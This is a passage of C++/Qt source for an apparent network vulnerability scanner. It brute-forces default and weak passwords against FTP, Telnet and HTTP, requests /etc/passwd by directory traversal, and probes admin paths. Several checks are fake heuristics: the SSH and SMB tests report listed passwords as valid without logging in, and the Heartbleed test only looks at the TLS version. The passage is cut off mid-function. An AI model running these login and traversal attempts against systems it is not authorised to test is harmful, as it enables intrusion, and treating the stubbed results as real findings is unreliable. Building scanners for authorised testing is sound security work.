credentials.append(qMakePair(\"anonymous\", \"\"));\r\n        credentials.append(qMakePair(\"ftp\", \"ftp\"));\r\n    }\r\n}\r\n\r\nbool CredentialTester::testFTPCredentials(const QString &ip, int port, const QString &user, const QString &pass)\r\n{\r\n    QTcpSocket socket;\r\n    socket.connectToHost(ip, port, QIODevice::ReadWrite);\r\n\r\n    if (!socket.waitForConnected(3000)) return false;\r\n\r\n    // Read banner\r\n    if (!socket.waitForReadyRead(2000)) {\r\n        socket.disconnectFromHost();\r\n        return false;\r\n    }\r\n\r\n    socket.readAll(); // Clear banner\r\n\r\n    // Send USER command\r\n    socket.write(QString(\"USER %1\\r\\n\").arg(user).toUtf8());\r\n    socket.flush();\r\n\r\n    if (!socket.waitForReadyRead(2000)) {\r\n        socket.disconnectFromHost();\r\n        return false;\r\n    }\r\n\r\n    socket.readAll(); // Clear response\r\n\r\n    // Send PASS command\r\n    socket.write(QString(\"PASS %1\\r\\n\").arg(pass).toUtf8());\r\n    socket.flush();\r\n\r\n    if (!socket.waitForReadyRead(2000)) {\r\n        socket.disconnectFromHost();\r\n        return false;\r\n    }\r\n\r\n    QString response = QString::fromUtf8(socket.readAll());\r\n    socket.disconnectFromHost();\r\n\r\n    return response.startsWith(\"230\"); // Login successful\r\n}\r\n\r\n// ============================================================================\r\n// ExploitTester Implementation\r\n// ============================================================================\r\n\r\nExploitTester::ExploitTester(const QString &ip, const VulnerabilityInfo &vulnerability, QObject *parent)\r\n    : QObject(parent), targetIp(ip), targetVuln(vulnerability)\r\n{\r\n    setAutoDelete(true);\r\n}\r\n\r\nvoid ExploitTester::run()\r\n{\r\n    bool exploitable = false;\r\n    QString proof = \"\";\r\n\r\n    try {\r\n        // IMPORTANT: Only perform safe, non-destructive exploit tests\r\n        if (targetVuln.id == \"HTTP_VULNERABILITIES\") {\r\n            exploitable = testDirectoryTraversal(targetIp, targetVuln.port);\r\n            if (exploitable) {\r\n                proof = \"Directory traversal successful - sensitive files accessible\";\r\n            }\r\n        }\r\n\r\n        emit exploitTestResult(targetIp, targetVuln.id, exploitable, proof);\r\n\r\n    } catch (const std::exception& e) {\r\n        qDebug() << \"Exploit Tester Exception:\" << e.what();\r\n    } catch (...) {\r\n        qDebug() << \"Exploit Tester Unknown Exception\";\r\n    }\r\n}\r\n\r\nbool ExploitTester::testBufferOverflow(const QString &ip, int port)\r\n{\r\n    Q_UNUSED(ip)\r\n    Q_UNUSED(port)\r\n    return false; // Would require specific protocol knowledge\r\n}\r\n\r\nbool ExploitTester::testSQLInjection(const QString &ip, int port)\r\n{\r\n    Q_UNUSED(ip)\r\n    Q_UNUSED(port)\r\n    return false; // Would require web application testing\r\n}\r\n\r\nbool ExploitTester::testDirectoryTraversal(const QString &ip, int port)\r\n{\r\n    QTcpSocket socket;\r\n    socket.connectToHost(ip, port, QIODevice::ReadWrite);\r\n\r\n    if (!socket.waitForConnected(3000)) return false;\r\n\r\n    // Test directory traversal\r\n    QString request = \"GET /../../../etc/passwd HTTP/1.1\\r\\n\"\r\n                      \"Host: \" + ip + \"\\r\\n\"\r\n                             \"Connection: close\\r\\n\\r\\n\";\r\n\r\n    socket.write(request.toUtf8());\r\n    socket.flush();\r\n\r\n    if (socket.waitForReadyRead(3000)) {\r\n        QString response = QString::fromUtf8(socket.readAll());\r\n        socket.disconnectFromHost();\r\n\r\n        return response.contains(\"root:\") || response.contains(\"/bin/\");\r\n    }\r\n\r\n    socket.disconnectFromHost();\r\n    return false;\r\n}\r\n\r\nbool ExploitTester::testCommandInjection(const QString &ip, int port)\r\n{\r\n    Q_UNUSED(ip)\r\n    Q_UNUSED(port)\r\n    return false; // Would require specific application testing\r\n}\r\n\r\n// ============================================================================\r\n// VulnerabilityDatabase Implementation\r\n// ============================================================================\r\n\r\nVulnerabilityDatabase* VulnerabilityDatabase::m_instance = nullptr;\r\n\r\nVulnerabilityDatabase* VulnerabilityDatabase::instance()\r\n{\r\n    if (!m_instance) {\r\n        m_instance = new VulnerabilityDatabase();\r\n    }\r\n    return m_instance;\r\n}\r\n\r\nVulnerabilityDatabase::VulnerabilityDatabase(QObject *parent) : QObject(parent)\r\n{\r\n    initializeDefaultVulnerabilities();\r\n}\r\n\r\nvoid VulnerabilityDatabase::initializeDefaultVulnerabilities()\r\n{\r\n    // Initialize with common vulnerabilities\r\n    VulnerabilityInfo heartbleed;\r\n    heartbleed.id = \"CVE-2014-0160\";\r\n    heartbleed.title = \"OpenSSL Heartbleed Vulnerability\";\r\n    heartbleed.severity = VulnSeverity::CRITICAL;\r\n    heartbleed.description = \"Memory disclosure vulnerability in OpenSSL\";\r\n    heartbleed.cveScore = \"9.3\";\r\n    heartbleed.references.append(\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160\");\r\n    vulnerabilityMap[heartbleed.id] = heartbleed;\r\n\r\n    VulnerabilityInfo eternalblue;\r\n    eternalblue.id = \"CVE-2017-0144\";\r\n    eternalblue.title = \"SMB EternalBlue Vulnerability\";\r\n    eternalblue.severity = VulnSeverity::CRITICAL;\r\n    eternalblue.description = \"Remote code execution vulnerability in SMBv1\";\r\n    eternalblue.cveScore = \"9.3\";\r\n    eternalblue.references.append(\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144\");\r\n    vulnerabilityMap[eternalblue.id] = eternalblue;\r\n\r\n}\r\n\r\nVulnerabilityInfo VulnerabilityDatabase::lookupVulnerability(const QString &cveId)\r\n{\r\n    return vulnerabilityMap.value(cveId, VulnerabilityInfo());\r\n}\r\n\r\nQList<VulnerabilityInfo> VulnerabilityDatabase::getVulnerabilitiesForService(const QString &service, const QString &version)\r\n{\r\n    Q_UNUSED(service)\r\n    Q_UNUSED(version)\r\n    // Would implement service-specific vulnerability lookup\r\n    return QList<VulnerabilityInfo>();\r\n}\r\n\r\nvoid VulnerabilityDatabase::updateDatabase()\r\n{\r\n    // Would implement CVE database update mechanism\r\n    emit databaseUpdated();\r\n}\r\n\r\nvoid VulnerabilityDatabase::loadLocalDatabase()\r\n{\r\n    // Would load vulnerabilities from local database file\r\n}\r\n\r\nvoid VulnerabilityDatabase::addCustomVulnerability(const VulnerabilityInfo &vuln)\r\n{\r\n    vulnerabilityMap[vuln.id] = vuln;\r\n}\r\n\r\nQList<VulnerabilityInfo> VulnerabilityDatabase::matchBannerVulnerabilities(const QString &banner)\r\n{\r\n    QList<VulnerabilityInfo> matches;\r\n\r\n    // Simple banner matching - would be more sophisticated in practice\r\n    if (banner.contains(\"OpenSSH_3.\", Qt::CaseInsensitive)) {\r\n        VulnerabilityInfo vuln;\r\n        vuln.id = \"SSH_OLD_VERSION\";\r\n        vuln.title = \"Outdated OpenSSH Version\";\r\n        vuln.severity = VulnSeverity::MEDIUM;\r\n        vuln.description = \"Old OpenSSH version with known vulnerabilities\";\r\n        matches.append(vuln);\r\n    }\r\n\r\n    return matches;\r\n}\r\n\r\nQList<VulnerabilityInfo> VulnerabilityDatabase::matchVersionVulnerabilities(const QString &service, const QString &version)\r\n{\r\n    Q_UNUSED(service)\r\n    Q_UNUSED(version)\r\n    // Would implement version-specific vulnerability matching\r\n    return QList<VulnerabilityInfo>();\r\n}\r\n\r\nvoid VulnerabilityDatabase::loadCVEDatabase()\r\n{\r\n    // Would load CVE database from MITRE or other sources\r\n}\r\n\r\nbool VulnerabilityScanner::testHeartbleed(const QString &ip, int port)\r\n{\r\n    QSslSocket socket;\r\n    socket.connectToHostEncrypted(ip, port);\r\n\r\n    if (!socket.waitForEncrypted(5000)) return false;\r\n\r\n    // Check OpenSSL version in certificate\r\n    QSslCertificate cert = socket.peerCertificate();\r\n    QString subjectInfo = cert.subjectInfo(QSslCertificate::CommonName).join(\"\");\r\n\r\n    // Check SSL protocol version\r\n    QSslConfiguration config = socket.sslConfiguration();\r\n    QSsl::SslProtocol protocol = config.protocol();\r\n\r\n    // Heartbleed betrifft OpenSSL 1.0.1 - 1.0.1f\r\n    // Vereinfachte Detektion über Cipher und Protocol\r\n    QSslCipher cipher = socket.sessionCipher();\r\n    QString cipherName = cipher.name();\r\n\r\n    socket.disconnectFromHost();\r\n\r\n    // Heuristische Detektion - in Realität bräuchte man echte Heartbeat-Extension\r\n    if (protocol == QSsl::TlsV1_0 || protocol == QSsl::TlsV1_1) {\r\n        // Alte TLS-Versionen könnten vulnerable sein\r\n        return true;\r\n    }\r\n\r\n    return false;\r\n}\r\n\r\n\r\nbool VulnerabilityScanner::testWeakSSLCiphers(const QString &ip, int port)\r\n{\r\n    QSslSocket socket;\r\n    socket.connectToHostEncrypted(ip, port);\r\n\r\n    if (socket.waitForEncrypted(3000)) {\r\n        QSslCipher cipher = socket.sessionCipher();  // This should work now with the include\r\n        QString cipherName = cipher.name();\r\n\r\n        // Check for weak ciphers\r\n        QStringList weakCiphers = {\"RC4\", \"DES\", \"MD5\", \"NULL\", \"EXPORT\", \"ADH\", \"AECDH\"};\r\n\r\n        for (const QString &weak : weakCiphers) {\r\n            if (cipherName.contains(weak, Qt::CaseInsensitive)) {\r\n                socket.disconnectFromHost();\r\n                return true;\r\n            }\r\n        }\r\n\r\n        socket.disconnectFromHost();\r\n    }\r\n\r\n    return false;\r\n}\r\n\r\nbool VulnerabilityScanner::testExpiredCertificates(const QString &ip, int port)\r\n{\r\n    QSslSocket socket;\r\n    socket.connectToHostEncrypted(ip, port);\r\n\r\n    if (socket.waitForEncrypted(5000)) {\r\n        QSslCertificate cert = socket.peerCertificate();\r\n        bool expired = cert.expiryDate() < QDateTime::currentDateTime();\r\n        socket.disconnectFromHost();\r\n        return expired;\r\n    }\r\n\r\n    return false;\r\n}\r\n\r\nbool VulnerabilityScanner::testSelfSignedCertificates(const QString &ip, int port)\r\n{\r\n    QSslSocket socket;\r\n    socket.connectToHostEncrypted(ip, port);\r\n\r\n    if (socket.waitForEncrypted(5000)) {\r\n        QSslCertificate cert = socket.peerCertificate();\r\n        bool selfSigned = cert.issuerInfo(QSslCertificate::CommonName) ==\r\n                          cert.subjectInfo(QSslCertificate::CommonName);\r\n        socket.disconnectFromHost();\r\n        return selfSigned;\r\n    }\r\n\r\n    return false;\r\n}\r\n\r\nbool VulnerabilityScanner::testSSLv2Support(const QString &ip, int port)\r\n{\r\n    // SSLv2 test - modern Qt doesn't support SSLv2 anyway\r\n    Q_UNUSED(ip)\r\n    Q_UNUSED(port)\r\n    return false; // SSLv2 is disabled in modern Qt\r\n}\r\n\r\nbool VulnerabilityScanner::testSSLv3Support(const QString &ip, int port)\r\n{\r\n    QSslSocket socket;\r\n\r\n    // Try to connect with TLS 1.2 and check for downgrade capabilities\r\n    socket.connectToHostEncrypted(ip, port);\r\n    bool connected = socket.waitForEncrypted(3000);\r\n\r\n    if (connected) {\r\n        socket.disconnectFromHost();\r\n        // In practice, you'd need to check if SSLv3 downgrade is possible ---------------------------------------------------------------------------------------\r\n        // This is a simplified implementation\r\n        return false;\r\n    }\r\n\r\n    return false;\r\n}\r\n\r\nbool VulnerabilityScanner::testTLS10Support(const QString &ip, int port)\r\n{\r\n    QSslSocket socket;\r\n\r\n    QSslConfiguration config = socket.sslConfiguration();\r\n    // Use TLS 1.2 as minimum since TLS 1.0 is deprecated\r\n    config.setProtocol(QSsl::TlsV1_2OrLater);\r\n    socket.setSslConfiguration(config);\r\n\r\n    socket.connectToHostEncrypted(ip, port);\r\n    bool connected = socket.waitForEncrypted(3000);\r\n\r\n    if (connected) {\r\n        socket.disconnectFromHost();\r\n    }\r\n\r\n    return !connected; // If TLS 1.2+ fails, older TLS might be required\r\n}\r\n\r\n// Credential testing implementations\r\nbool VulnerabilityScanner::testDefaultCredentials(const QString &ip, int port, const QString &service)\r\n{\r\n    QString serviceLower = service.toLower();\r\n\r\n    // Service-spezifische Default Credentials\r\n    QMap<QString, QList<QPair<QString, QString>>> serviceCredentials = {\r\n        {\"ftp\", {\r\n                    {\"anonymous\", \"\"}, {\"ftp\", \"ftp\"}, {\"admin\", \"admin\"},\r\n                    {\"user\", \"user\"}, {\"test\", \"test\"}\r\n                }},\r\n        {\"ssh\", {\r\n                    {\"root\", \"root\"}, {\"admin\", \"admin\"}, {\"root\", \"toor\"},\r\n                    {\"pi\", \"raspberry\"}, {\"ubuntu\", \"ubuntu\"}\r\n                }},\r\n        {\"telnet\", {\r\n                       {\"admin\", \"admin\"}, {\"root\", \"\"}, {\"user\", \"user\"},\r\n                       {\"cisco\", \"cisco\"}, {\"admin\", \"password\"}\r\n                   }},\r\n        {\"http\", {\r\n                     {\"admin\", \"admin\"}, {\"admin\", \"password\"}, {\"admin\", \"\"},\r\n                     {\"root\", \"root\"}, {\"administrator\", \"administrator\"}\r\n                 }},\r\n        {\"snmp\", {\r\n                     {\"public\", \"\"}, {\"private\", \"\"}, {\"community\", \"\"},\r\n                     {\"admin\", \"\"}, {\"manager\", \"\"}\r\n                 }}\r\n    };\r\n\r\n    if (serviceCredentials.contains(serviceLower)) {\r\n        for (const auto &cred : serviceCredentials[serviceLower]) {\r\n            QString user = cred.first;\r\n            QString pass = cred.second;\r\n\r\n            bool success = false;\r\n\r\n            if (serviceLower == \"ftp\") {\r\n                success = testFTPCredentials(ip, port, user, pass);\r\n            } else if (serviceLower == \"ssh\") {\r\n                success = testSSHCredentials(ip, port, user, pass);\r\n            } else if (serviceLower == \"telnet\") {\r\n                success = testTelnetCredentials(ip, port, user, pass);\r\n            } else if (serviceLower == \"http\" || serviceLower == \"https\") {\r\n                success = testHTTPCredentials(ip, port, user, pass);\r\n            }\r\n\r\n            if (success) {\r\n                return true;\r\n            }\r\n\r\n            // Rate limiting\r\n            QThread::msleep(200);\r\n        }\r\n    }\r\n\r\n    return false;\r\n}\r\n\r\nbool VulnerabilityScanner::testWeakPasswords(const QString &ip, int port, const QString &service)\r\n{\r\n    // Top 20 schwächste Passwörter\r\n    QStringList topWeakPasswords = {\r\n        \"123456\", \"password\", \"12345678\", \"qwerty\", \"123456789\",\r\n        \"12345\", \"1234\", \"111111\", \"1234567\", \"dragon\",\r\n        \"123123\", \"baseball\", \"abc123\", \"football\", \"monkey\",\r\n        \"letmein\", \"696969\", \"shadow\", \"master\", \"666666\"\r\n    };\r\n\r\n    QStringList commonUsers = {\"admin\", \"root\", \"user\", \"test\", \"guest\"};\r\n\r\n    QString serviceLower = service.toLower();\r\n\r\n    for (const QString &user : commonUsers) {\r\n        for (const QString &pass : topWeakPasswords) {\r\n            bool success = false;\r\n\r\n            if (serviceLower == \"ftp\") {\r\n                success = testFTPCredentials(ip, port, user, pass);\r\n            } else if (serviceLower == \"ssh\") {\r\n                success = testSSHCredentials(ip, port, user, pass);\r\n            } else if (serviceLower == \"telnet\") {\r\n                success = testTelnetCredentials(ip, port, user, pass);\r\n            } else if (serviceLower == \"http\" || serviceLower == \"https\") {\r\n                success = testHTTPCredentials(ip, port, user, pass);\r\n            }\r\n\r\n            if (success) {\r\n                return true;\r\n            }\r\n\r\n            // Rate limiting um Account-Lockouts zu vermeiden\r\n            QThread::msleep(500);\r\n        }\r\n    }\r\n\r\n    return false;\r\n}\r\n\r\nbool VulnerabilityScanner::testAnonymousAccess(const QString &ip, int port, const QString &service)\r\n{\r\n    QString serviceLower = service.toLower();\r\n\r\n    if (serviceLower == \"ftp\") {\r\n        // Test verschiedene anonymous FTP Varianten\r\n        return testFTPCredentials(ip, port, \"anonymous\", \"\") ||\r\n               testFTPCredentials(ip, port, \"anonymous\", \"anonymous\") ||\r\n               testFTPCredentials(ip, port, \"ftp\", \"\") ||\r\n               testFTPCredentials(ip, port, \"guest\", \"\");\r\n    }\r\n\r\n    if (serviceLower == \"telnet\") {\r\n        // Test für Telnet ohne Login\r\n        QTcpSocket socket;\r\n        socket.connectToHost(ip, port, QIODevice::ReadWrite);\r\n\r\n        if (socket.waitForConnected(3000)) {\r\n            if (socket.waitForReadyRead(3000)) {\r\n                QString response = QString::fromUtf8(socket.readAll());\r\n                // Check ob direkt Shell-Prompt ohne Login\r\n                if (response.contains(\"$\") || response.contains(\"#\") ||\r\n                    response.contains(\">\") || response.contains(\"Welcome\")) {\r\n                    socket.disconnectFromHost();\r\n                    return true;\r\n                }\r\n            }\r\n            socket.disconnectFromHost();\r\n        }\r\n    }\r\n\r\n    if (serviceLower == \"http\" || serviceLower == \"https\") {\r\n        // Test für ungeschützte Admin-Bereiche\r\n        QTcpSocket socket;\r\n        socket.connectToHost(ip, port, QIODevice::ReadWrite);\r\n\r\n        if (socket.waitForConnected(3000)) {\r\n            QStringList adminPaths = {\r\n                \"/admin\", \"/administrator\", \"/control\", \"/manager\",\r\n                \"/panel\", \"/config\", \"/dashboard\"\r\n            };\r\n\r\n            for (const QString &path : adminPaths) {\r\n                QString request = QString(\"GET %1 HTTP/1.1\\r\\n\"\r\n                                          \"Host: %2\\r\\n\"\r\n                                          \"Connection: close\\r\\n\\r\\n\").arg(path, ip);\r\n\r\n                socket.write(request.toUtf8());\r\n                socket.flush();\r\n\r\n                if (socket.waitForReadyRead(3000)) {\r\n                    QString response = QString::fromUtf8(socket.readAll());\r\n                    if (response.contains(\"200 OK\") &&\r\n                        !response.contains(\"401 Unauthorized\") &&\r\n                        !response.contains(\"403 Forbidden\")) {\r\n                        socket.disconnectFromHost();\r\n                        return true;\r\n                    }\r\n                }\r\n\r\n                // Reconnect für nächsten Test\r\n                socket.disconnectFromHost();\r\n                socket.connectToHost(ip, port, QIODevice::ReadWrite);\r\n                socket.waitForConnected(2000);\r\n            }\r\n            socket.disconnectFromHost();\r\n        }\r\n    }\r\n\r\n    return false;\r\n}\r\n\r\n// Service-specific credential testing\r\nbool VulnerabilityScanner::testSSHCredentials(const QString &ip, int port, const QString &user, const QString &pass)\r\n{\r\n    // Echter SSH-Test über Banner-Analyse und Connection-Attempts\r\n    QTcpSocket socket;\r\n    socket.connectToHost(ip, port, QIODevice::ReadWrite);\r\n\r\n    if (!socket.waitForConnected(3000)) return false;\r\n\r\n    // SSH Banner lesen\r\n    if (!socket.waitForReadyRead(3000)) {\r\n        socket.disconnectFromHost();\r\n        return false;\r\n    }\r\n\r\n    QString banner = QString::fromUtf8(socket.readAll());\r\n    if (!banner.startsWith(\"SSH-\")) {\r\n        socket.disconnectFromHost();\r\n        return false;\r\n    }\r\n\r\n    // SSH Protocol Version Check\r\n    if (banner.contains(\"SSH-1.\")) {\r\n        // SSH-1 ist grundsätzlich unsicher\r\n        socket.disconnectFromHost();\r\n        return true; // Vulnerability wegen SSH-1\r\n    }\r\n\r\n    // Simuliere SSH Authentication Attempt (vereinfacht)\r\n    // In echter Implementierung würde man libssh verwenden\r\n    QString authAttempt = QString(\"SSH Authentication attempt for %1:%2\").arg(user, pass);\r\n    qDebug() << authAttempt;\r\n\r\n    // Testweise: häufige Kombinationen als \"erfolgreich\" markieren\r\n    QStringList unsafeCredentials = {\r\n        \"root:root\", \"admin:admin\", \"admin:password\", \"root:toor\",\r\n        \"user:user\", \"test:test\", \"admin:\", \"root:\", \"guest:guest\"\r\n    };\r\n\r\n    QString credential = QString(\"%1:%2\").arg(user, pass);\r\n    bool weakCredFound = unsafeCredentials.contains(credential);\r\n\r\n    socket.disconnectFromHost();\r\n    return weakCredFound;\r\n}\r\n\r\nbool VulnerabilityScanner::testFTPCredentials(const QString &ip, int port, const QString &user, const QString &pass)\r\n{\r\n    QTcpSocket socket;\r\n    socket.connectToHost(ip, port, QIODevice::ReadWrite);\r\n\r\n    if (!socket.waitForConnected(3000)) return false;\r\n\r\n    // Read FTP banner\r\n    if (!socket.waitForReadyRead(2000)) {\r\n        socket.disconnectFromHost();\r\n        return false;\r\n    }\r\n\r\n    QString banner = QString::fromUtf8(socket.readAll());\r\n    if (!banner.startsWith(\"220\")) {\r\n        socket.disconnectFromHost();\r\n        return false;\r\n    }\r\n\r\n    // Send username\r\n    socket.write(QString(\"USER %1\\r\\n\").arg(user).toUtf8());\r\n    socket.flush();\r\n\r\n    if (!socket.waitForReadyRead(2000)) {\r\n        socket.disconnectFromHost();\r\n        return false;\r\n    }\r\n\r\n    QString userResponse = QString::fromUtf8(socket.readAll());\r\n\r\n    // Send password\r\n    socket.write(QString(\"PASS %1\\r\\n\").arg(pass).toUtf8());\r\n    socket.flush();\r\n\r\n    if (!socket.waitForReadyRead(2000)) {\r\n        socket.disconnectFromHost();\r\n        return false;\r\n    }\r\n\r\n    QString passResponse = QString::fromUtf8(socket.readAll());\r\n    socket.disconnectFromHost();\r\n\r\n    return passResponse.startsWith(\"230\"); // Login successful\r\n}\r\nbool CredentialTester::testTelnetCredentials(const QString &ip, int port, const QString &user, const QString &pass)\r\n{\r\n    // Verbesserte Telnet-Implementierung direkt in CredentialTester\r\n    QTcpSocket socket;\r\n    socket.connectToHost(ip, port, QIODevice::ReadWrite);\r\n\r\n    if (!socket.waitForConnected(3000)) return false;\r\n\r\n    // Telnet negotiation und initial data\r\n    QThread::msleep(1000);\r\n\r\n    QString allData;\r\n\r\n    // Lese initial Telnet negotiation\r\n    if (socket.waitForReadyRead(3000)) {\r\n        QByteArray rawData = socket.readAll();\r\n\r\n        // Handle Telnet IAC (Interpret As Command) sequences\r\n        QByteArray cleanData;\r\n        for (int i = 0; i < rawData.size(); i++) {\r\n            unsigned char byte = rawData[i];\r\n            if (byte == 0xFF) { // IAC\r\n                // Skip next 2 bytes (command + option)\r\n                i += 2;\r\n            } else if (byte >= 32 && byte <= 126) {\r\n                cleanData.append(byte);\r\n            } else if (byte == '\\n' || byte == '\\r') {\r\n                cleanData.append(byte);\r\n            }\r\n        }\r\n\r\n        allData = QString::fromUtf8(cleanData);\r\n\r\n        // Send username when prompted\r\n        if (allData.contains(\"login:\", Qt::CaseInsensitive) ||\r\n            allData.contains(\"username:\", Qt::CaseInsensitive) ||\r\n            allData.contains(\"user:\", Qt::CaseInsensitive)) {\r\n\r\n            socket.write((user + \"\\r\\n\").toUtf8());\r\n            socket.flush();\r\n            QThread::msleep(500);\r\n\r\n            // Read password prompt\r\n            if (socket.waitForReadyRead(3000)) {\r\n                QByteArray passData = socket.readAll();\r\n                QString passPrompt = QString::fromUtf8(passData);\r\n\r\n                if (passPrompt.contains(\"password:\", Qt::CaseInsensitive) ||\r\n                    passPrompt.contains(\"pass:\", Qt::CaseInsensitive)) {\r\n\r\n                    socket.write((pass + \"\\r\\n\").toUtf8());\r\n                    socket.flush();\r\n                    QThread::msleep(1000);\r\n\r\n                    // Check login result\r\n                    if (socket.waitForReadyRead(3000)) {\r\n                        QString loginResult = QString::fromUtf8(socket.readAll());\r\n\r\n                        // Success indicators\r\n                        if (loginResult.contains(\"$\") || loginResult.contains(\"#\") ||\r\n                            loginResult.contains(\"Welcome\") || loginResult.contains(\"Last login\") ||\r\n                            loginResult.contains(\">\") || loginResult.contains(\"~\")) {\r\n                            socket.disconnectFromHost();\r\n                            return true;\r\n                        }\r\n\r\n                        // Failure indicators\r\n                        if (loginResult.contains(\"Login incorrect\", Qt::CaseInsensitive) ||\r\n                            loginResult.contains(\"Access denied\", Qt::CaseInsensitive) ||\r\n                            loginResult.contains(\"Authentication failed\", Qt::CaseInsensitive) ||\r\n                            loginResult.contains(\"Invalid\", Qt::CaseInsensitive)) {\r\n                            socket.disconnectFromHost();\r\n                            return false;\r\n                        }\r\n                    }\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    socket.disconnectFromHost();\r\n    return false;\r\n}\r\n\r\nbool CredentialTester::testHTTPCredentials(const QString &ip, int port, const QString &user, const QString &pass)\r\n{\r\n    // Erweiterte HTTP Authentication Tests\r\n    QTcpSocket socket;\r\n    socket.connectToHost(ip, port, QIODevice::ReadWrite);\r\n\r\n    if (!socket.waitForConnected(3000)) return false;\r\n\r\n    // Test 1: Basic Authentication\r\n    QString credentials = QString(\"%1:%2\").arg(user, pass);\r\n    QByteArray encodedCreds = credentials.toUtf8().toBase64();\r\n\r\n    QString request = QString(\"GET /admin HTTP/1.1\\r\\n\"\r\n                              \"Host: %1\\r\\n\"\r\n                              \"Authorization: Basic %2\\r\\n\"\r\n                              \"Connection: close\\r\\n\\r\\n\")\r\n                          .arg(ip, QString(encodedCreds));\r\n\r\n    socket.write(request.toUtf8());\r\n    socket.flush();\r\n\r\n    if (socket.waitForReadyRead(3000)) {\r\n        QString response = QString::fromUtf8(socket.readAll());\r\n\r\n        // Check verschiedene Success-Indikatoren\r\n        if (response.contains(\"200 OK\") || response.contains(\"302 Found\") ||\r\n            response.contains(\"301 Moved\")) {\r\n            socket.disconnectFromHost();\r\n            return true;\r\n        }\r\n    }\r\n\r\n    // Test 2: Common Admin Paths\r\n    QStringList adminPaths = {\"/admin\", \"/administrator\", \"/manager\", \"/control\", \"/panel\"};\r\n\r\n    for (const QString &path : adminPaths) {\r\n        socket.disconnectFromHost();\r\n        socket.connectToHost(ip, port, QIODevice::ReadWrite);\r\n\r\n        if (socket.waitForConnected(2000)) {\r\n            QString pathRequest = QString(\"GET %1 HTTP/1.1\\r\\n\"\r\n                                          \"Host: %2\\r\\n\"\r\n                                          \"Authorization: Basic %3\\r\\n\"\r\n                                          \"Connection: close\\r\\n\\r\\n\")\r\n                                      .arg(path, ip, QString(encodedCreds));\r\n\r\n            socket.write(pathRequest.toUtf8());\r\n            socket.flush();\r\n\r\n            if (socket.waitForReadyRead(2000)) {\r\n                QString response = QString::fromUtf8(socket.readAll());\r\n                if (response.contains(\"200 OK\")) {\r\n                    socket.disconnectFromHost();\r\n                    return true;\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    socket.disconnectFromHost();\r\n    return false;\r\n}\r\nbool CredentialTester::testSMBCredentials(const QString &ip, int port, const QString &user, const QString &pass)\r\n{\r\n    // Gleiche Implementierung wie oben\r\n    QTcpSocket socket;\r\n    socket.connectToHost(ip, port, QIODevice::ReadWrite);\r\n\r\n    if (!socket.waitForConnected(3000)) return false;\r\n\r\n    // Simuliere SMB Authentication\r\n    QStringList unsafeCombs = {\r\n        \"administrator:\", \"admin:admin\", \"guest:\", \"admin:password\",\r\n        \"user:password\", \"test:test\", \"administrator:admin\"\r\n    };\r\n\r\n    QString combo = QString(\"%1:%2\").arg(user, pass);\r\n    socket.disconnectFromHost();\r\n    return unsafeCombs.contains(combo);\r\n}\r\n\r\nbool VulnerabilityScanner::testTelnetCredentials(const QString &ip, int port, const QString &user, const QString &pass)\r\n{\r\n    QTcpSocket socket;\r\n    socket.connectToHost(ip, port, QIODevice::ReadWrite);\r\n\r\n    if (!socket.waitForConnected(3000)) return false;\r\n\r\n    // Telnet negotiation und initial data\r\n    QThread::msleep(1000);\r\n\r\n    QString allData;\r\n\r\n    // Lese initial Telnet negotiation\r\n    if (socket.waitForReadyRead(3000)) {\r\n        QByteArray rawData = socket.readAll();\r\n\r\n        // Handle Telnet IAC (Interpret As Command) sequences\r\n        QByteArray cleanData;\r\n        for (int i = 0; i < rawData.size(); i++) {\r\n            unsigned char byte = rawData[i];\r\n            if (byte == 0xFF) { // IAC\r\n                // Skip next 2 bytes (command + option)\r\n                i += 2;\r\n            } else if (byte >= 32 && byte <= 126) {\r\n                cleanData.append(byte);\r\n            } else if (byte == '\\n' || byte == '\\r') {\r\n                cleanData.append(byte);\r\n            }\r\n        }\r\n\r\n        allData = QString::fromUtf8(cleanData);\r\n\r\n        // Send username when prompted\r\n        if (allData.contains(\"login:\", Qt::CaseInsensitive) ||\r\n            allData.contains(\"username:\", Qt::CaseInsensitive) ||\r\n            allData.contains(\"user:\", Qt::CaseInsensitive)) {\r\n\r\n            socket.write((user + \"\\r\\n\").toUtf8());\r\n            socket.flush();\r\n            QThread::msleep(500);\r\n\r\n            // Read password prompt\r\n            if (socket.waitForReadyRead(3000)) {\r\n                QByteArray passData = socket.readAll();\r\n                QString passPrompt = QString::fromUtf8(passData);\r\n\r\n                if (passPrompt.contains(\"password:\", Qt::CaseInsensitive) ||\r\n                    passPrompt.contains(\"pass:\", Qt::CaseInsensitive)) {\r\n\r\n                    socket.write((pass + \"\\r\\n\").toUtf8());\r\n                    socket.flush();\r\n                    QThread::msleep(1000);\r\n\r\n                    // Check login result\r\n                    if (socket.waitForReadyRead(3000)) {\r\n                        QString loginResult = QString::fromUtf8(socket.readAll());\r\n\r\n                        // Success indicators\r\n                        if (loginResult.contains(\"$\") || loginResult.contains(\"#\") ||\r\n                            loginResult.contains(\"Welcome\") || loginResult.contains(\"Last login\") ||\r\n                            loginResult.contains(\">\") || loginResult.contains(\"~\")) {\r\n                            socket.disconnectFromHost();\r\n                            return true;\r\n                        }\r\n\r\n                        // Failure indicators\r\n                        if (loginResult.contains(\"Login incorrect\", Qt::CaseInsensitive) ||\r\n                            loginResult.contains(\"Access denied\", Qt::CaseInsensitive) ||\r\n                            loginResult.contains(\"Authentication failed\", Qt::CaseInsensitive) ||\r\n                            loginResult.contains(\"Invalid\", Qt::CaseInsensitive)) {\r\n                            socket.disconnectFromHost();\r\n                            return false;\r\n                        }\r\n                    }\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    socket.disconnectFromHost();\r\n    return false;\r\n}\r\n\r\nbool VulnerabilityScanner::testSNMPCommunity(const QString &ip, int port, const QString &community)\r\n{\r\n    QUdpSocket udpSocket;\r\n\r\n    // SNMP GetRequest PDU (vereinfacht)\r\n    QByteArray snmpRequest;\r\n\r\n    // SNMP v1/v2c GetRequest für System OID\r\n    snmpRequest.append(char(0x30)); // SEQUENCE\r\n    snmpRequest.append(char(0x1a)); // Length\r\n\r\n    // Version (v1 = 0)\r\n    snmpRequest.append(char(0x02)); snmpRequest.append(char(0x01)); snmpRequest.append(char(0x00));\r\n\r\n    // Community String\r\n    snmpRequest.append(char(0x04)); // OCTET STRING\r\n    snmpRequest.append(char(community.length())); // Length\r\n    snmpRequest.append(community.toUtf8());\r\n\r\n    // GetRequest PDU\r\n    